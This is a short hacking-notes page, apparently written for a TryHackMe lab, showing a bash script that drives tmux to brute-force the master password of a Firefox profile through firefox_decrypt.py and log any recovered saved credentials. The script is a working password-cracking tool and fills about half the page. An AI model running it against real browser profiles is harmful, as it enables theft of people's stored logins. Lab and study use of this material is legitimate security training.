# Bruteforce with TMUX

## Theory

In some occasions, we will find cases where we need to use brute force in some scripts, but they lack this function. There are several ways to implement code in that script but it is usually difficult (especially if we are talking about very large scripts and if time is an important factor). An alternative to this is to use tmux commands to simulate a brute force along with a script. In this case, we will see an example with a Python script to extract Firefox credentials, called firefox\_decrypt.py.&#x20;

Since this script does not have a brute force option, we use tmux and bash commands to accomplish this action.

## Practice

### Requirements

* Have the script (firefox\_decrypt.py), the wordlist.txt and the .mozilla folder in the same directory.
* Specify the directory where these files are located in the script.
* Change the profile number to be used.

```bash
#!/bin/bash

# Ctrl+C
trap ctrl_c INT

function ctrl_c(){
        echo -e "\n[!] Exiting...\n"
  echo -e "[!] Don't forget to delete the session created with tmux named $sess_name..."
  exit 0
}

# Variables:
sess_name="bruteForce" # Name of the new tmux session.
profile_num=2 # Profile number to be used.
t=0.3 # Delay between each command.

# Create new tmux session:
tmux new -d -s $sess_name
# Change directory:
tmux send-keys -t $sess_name "cd /home/leviswings/TryHackMe/Chronicle/content/firefox_decrypt" Enter
sleep $t
# Wordlist for bruteforce:
lines_file=$(cat wordlist.txt | wc -l)

# Bruteforce:
for word in $(cat wordlist.txt); do
  tmux send-keys -t $sess_name "echo \"[*] Pass: $word\" >> results.txt" Enter ; sleep $t
  tmux send-keys -t $sess_name "python3 firefox_decrypt.py .mozilla/firefox >> results.txt" Enter ; sleep $t
  tmux send-keys -t $sess_name $profile_num Enter ; sleep $t
  tmux send-keys -t $sess_name "$word" Enter ; sleep $t
done
```

While running this script, you can detach from your current tmux session and join the "bruteForce" session. The results will be saved in the `results.txt` file but the errors will not. You will see all the words used and, if there was a valid password, you will see the credentials in that file.
